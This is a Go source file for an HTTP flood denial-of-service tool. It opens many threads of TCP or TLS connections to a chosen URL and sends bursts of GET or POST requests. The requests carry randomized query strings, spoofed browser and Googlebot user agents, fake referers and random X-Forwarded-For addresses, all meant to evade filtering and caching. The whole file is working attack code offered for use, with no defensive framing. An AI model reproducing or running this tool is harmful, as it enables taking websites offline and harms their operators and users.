package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

var (
	host       = ""
	port       = "80"
	page       = ""
	mode       = ""
	abcd       = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM"
	start      = make(chan bool)
	acceptall  = []string{
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept-Encoding: gzip, deflate\r\n",
		"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: iso-8859-1\r\nAccept-Encoding: gzip\r\n",
		"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1\r\nAccept-Encoding: gzip\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
		"Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\n",
		"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
		"Accept: text/html, application/xhtml+xml",
		"Accept-Language: en-US,en;q=0.5\r\n",
		"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\n",
		"Accept: text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n"}
	key        string
	choice     = []string{"Macintosh", "Windows", "X11"}
	choice2    = []string{"68K", "PPC", "Intel Mac OS X"}
	choice3    = []string{"Win3.11", "WinNT3.51", "WinNT4.0", "Windows NT 5.0", "Windows NT 5.1", "Windows NT 5.2", "Windows NT 6.0", "Windows NT 6.1", "Windows NT 6.2", "Win 9x 4.90", "WindowsCE", "Windows XP", "Windows 7", "Windows 8", "Windows NT 10.0; Win64; x64"}
	choice4    = []string{"Linux i686", "Linux x86_64"}
	choice5    = []string{"chrome", "spider", "ie"}
	choice6    = []string{".NET CLR", "SV1", "Tablet PC", "Win64; IA64", "Win64; x64", "WOW64"}
	spider     = []string{
		"AdsBot-Google (http://www.google.com/adsbot.html)",
		"Baiduspider (http://www.baidu.com/search/spider.htm)",
		"FeedFetcher-Google; (http://www.google.com/feedfetcher.html)",
		"Googlebot/2.1 (http://www.googlebot.com/bot.html)",
		"Googlebot-Image/1.0",
		"Googlebot-News",
		"Googlebot-Video/1.0",
	}
	referers = []string{
		"https://www.google.com/search?q=",
		"https://check-host.net/",
		"https://www.facebook.com/",
		"https://www.youtube.com/",
		"https://www.fbi.com/",
		"https://www.bing.com/search?q=",
		"https://r.search.yahoo.com/",
		"https://www.cia.gov/index.html",
		"https://vk.com/profile.php?auto=",
		"https://www.usatoday.com/search/results?q=",
		"https://help.baidu.com/searchResult?keywords=",
		"https://steamcommunity.com/market/search?q=",
		"https://www.ted.com/search?q=",
		"https://play.google.com/store/search?q=",
	}
	counter      int64
	proxyList    []string
	useProxy     bool
	proxyIndex   int32
	httpClient   *http.Client
	randomHeader bool
)

func init() {
	rand.Seed(time.Now().UnixNano())
	httpClient = &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
			DialContext: (&net.Dialer{
				Timeout:   5 * time.Second,
				KeepAlive: 5 * time.Second,
				DualStack: true,
			}).DialContext,
		},
		Timeout: 5 * time.Second,
	}
}

func getuseragent() string {
	platform := choice[rand.Intn(len(choice))]
	var os string
	if platform == "Macintosh" {
		os = choice2[rand.Intn(len(choice2))]
	} else if platform == "Windows" {
		os = choice3[rand.Intn(len(choice3))]
	} else if platform == "X11" {
		os = choice4[rand.Intn(len(choice4))]
	}
	browser := choice5[rand.Intn(len(choice5))]
	if browser == "chrome" {
		webkit := strconv.Itoa(rand.Intn(599-500) + 500)
		uwu := strconv.Itoa(rand.Intn(99)) + ".0" + strconv.Itoa(rand.Intn(9999)) + "." + strconv.Itoa(rand.Intn(999))
		return "Mozilla/5.0 (" + os + ") AppleWebKit/" + webkit + ".0 (KHTML, like Gecko) Chrome/" + uwu + " Safari/" + webkit
	} else if browser == "ie" {
		uwu := strconv.Itoa(rand.Intn(99)) + ".0"
		engine := strconv.Itoa(rand.Intn(99)) + ".0"
		option := rand.Intn(1)
		var token string
		if option == 1 {
			token = choice6[rand.Intn(len(choice6))] + "; "
		}
		return "Mozilla/5.0 (compatible; MSIE " + uwu + "; " + os + "; " + token + "Trident/" + engine + ")"
	}
	return spider[rand.Intn(len(spider))]
}

func rotateProxy() string {
	if !useProxy || len(proxyList) == 0 {
		return ""
	}
	idx := atomic.AddInt32(&proxyIndex, 1) % int32(len(proxyList))
	return proxyList[idx]
}

func buildFloodRequest(addr string) string {
	header := ""
	if mode == "get" {
		header += "GET " + page + key + strconv.Itoa(rand.Intn(2147483647)) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + string(abcd[rand.Intn(len(abcd))]) + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		if os.Args[5] == "nil" {
			if randomHeader {
				header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
				header += "User-Agent: " + getuseragent() + "\r\n"
				header += acceptall[rand.Intn(len(acceptall))]
				header += "Referer: " + referers[rand.Intn(len(referers))] + "\r\n"
				header += "X-Forwarded-For: " + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "." + strconv.Itoa(rand.Intn(255)) + "\r\n"
				header += "X-Requested-With: XMLHttpRequest\r\n"
				header += "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\r\n"
			} else {
				header += "Connection: Keep-Alive\r\nCache-Control: max-age=0\r\n"
				header += "User-Agent: " + getuseragent() + "\r\n"
				header += acceptall[rand.Intn(len(acceptall))]
				header += "Referer: " + referers[rand.Intn(len(referers))] + "\r\n"
			}
		} else {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		}
	} else if mode == "post" {
		data := ""
		if os.Args[5] != "nil" {
			func() {
				fi, err := os.Open(os.Args[5])
				if err != nil {
					return
				}
				defer fi.Close()
				br := bufio.NewReader(fi)
				for {
					a, _, c := br.ReadLine()
					if c == io.EOF {
						break
					}
					header += string(a) + "\r\n"
				}
			}()
		} else {
			data = "f"
		}
		header += "POST " + page + " HTTP/1.1\r\nHost: " + addr + "\r\n"
		header += "Connection: Keep-Alive\r\nContent-Type: x-www-form-urlencoded\r\nContent-Length: " + strconv.Itoa(len(data)) + "\r\n"
		header += "Accept-Encoding: gzip, deflate\r\n\n" + data + "\r\n"
	}
	return header + "\r\n"
}

func flood() {
	addr := host + ":" + port
	<-start
	for {
		if port == "443" {
			cfg := &tls.Config{
				InsecureSkipVerify: true,
				ServerName:         host,
			}
			s, err := tls.Dial("tcp", addr, cfg)
			if err == nil {
				for i := 0; i < 100; i++ {
					request := buildFloodRequest(addr)
					s.Write([]byte(request))
					atomic.AddInt64(&counter, 1)
				}
				s.Close()
			}
		} else {
			s, err := net.Dial("tcp", addr)
			if err == nil {
				for i := 0; i < 100; i++ {
					request := buildFloodRequest(addr)
					s.Write([]byte(request))
					atomic.AddInt64(&counter, 1)
				}
				s.Close()
			}
		}
	}
}

func main() {
	if len(os.Args) < 6 {
		fmt.Println("Usage:", os.Args[0], "<url> <threads> <get/post> <seconds> <header.txt/nil> [proxy.txt]")
		os.Exit(1)
	}

	u, err := url.Parse(os.Args[1])
	if err != nil {
		println("Invalid URL")
		os.Exit(1)
	}

	tmp := strings.Split(u.Host, ":")
	host = tmp[0]
	if u.Scheme == "https" {
		port = "443"
	} else {
		port = u.Port()
	}
	if port == "" {
		port = "80"
	}
	page = u.Path
	if os.Args[3] != "get" && os.Args[3] != "post" {
		println("Invalid mode")
		os.Exit(1)
	}
	mode = os.Args[3]

	threads, err := strconv.Atoi(os.Args[2])
	if err != nil || threads <= 0 {
		fmt.Println("Invalid threads count")
		os.Exit(1)
	}

	limit, err := strconv.Atoi(os.Args[4])
	if err != nil || limit <= 0 {
		fmt.Println("Invalid time limit")
		os.Exit(1)
	}

	if strings.Contains(page, "?") {
		key = "&"
	} else {
		key = "?"
	}

	if len(os.Args) > 6 {
		func() {
			fi, err := os.Open(os.Args[6])
			if err != nil {
				return
			}
			defer fi.Close()
			br := bufio.NewReader(fi)
			for {
				a, _, c := br.ReadLine()
				if c == io.EOF {
					break
				}
				proxyList = append(proxyList, string(a))
			}
			useProxy = len(proxyList) > 0
		}()
	}

	randomHeader = true

	for i := 0; i < threads; i++ {
		go flood()
		time.Sleep(time.Millisecond * 5)
	}

	fmt.Printf("Flooding %s for %d seconds with %d threads\n", os.Args[1], limit, threads)
	close(start)

	go func() {
		ticker := time.NewTicker(time.Second)
		defer ticker.Stop()
		for range ticker.C {
			fmt.Printf("\rRequests: %d RPS: %d", atomic.LoadInt64(&counter), atomic.LoadInt64(&counter)/int64(limit))
		}
	}()

	time.Sleep(time.Duration(limit) * time.Second)
	fmt.Printf("\nTotal requests sent: %d\n", atomic.LoadInt64(&counter))
}
